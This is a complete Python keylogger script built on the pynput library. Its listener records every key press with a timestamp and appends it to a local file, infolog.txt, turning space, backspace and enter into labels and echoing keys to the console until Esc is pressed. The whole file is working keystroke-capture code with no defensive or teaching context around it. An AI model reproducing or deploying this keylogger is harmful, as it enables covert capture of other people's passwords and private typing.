#Install pynput
import os
from datetime import datetime
from pynput.keyboard import Key, Listener

count = 0
keyList = []

# Reference https://pypi.org/project/pynput/
def on_press(key):
    global keyList, count
    keyList.append((key, datetime.now()))
    count += 1

    #Every 1 character will put into the file
    if count >= 1:
        count = 0
        writeFile(keyList)
        keyList = []

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

def writeFile(keyList):
    with open("infolog.txt", "a" if os.path.exists("infolog.txt") else "w") as logFile:
        for key ,timestamp in keyList:
            filtered = str(key)
            timestamp_str = timestamp.strftime("[%Y-%m-%d %H:%M:%S]")
            print(filtered)
            if filtered.find("backspace") > 0:
                logFile.write(f"{timestamp_str} [backspace]\n")
            elif filtered.find("space") > 0:
                logFile.write(f"{timestamp_str} [space]\n")
            elif filtered.find("enter") > 0:
                logFile.write(f"{timestamp_str} [Enter]\n")
            elif filtered.find("Key") == -1: # return -1 if the word "Key" not found 
                logFile.write(f"{timestamp_str} {filtered}\n")

with Listener(on_press = on_press ,on_release = on_release) as listener:
    listener.join()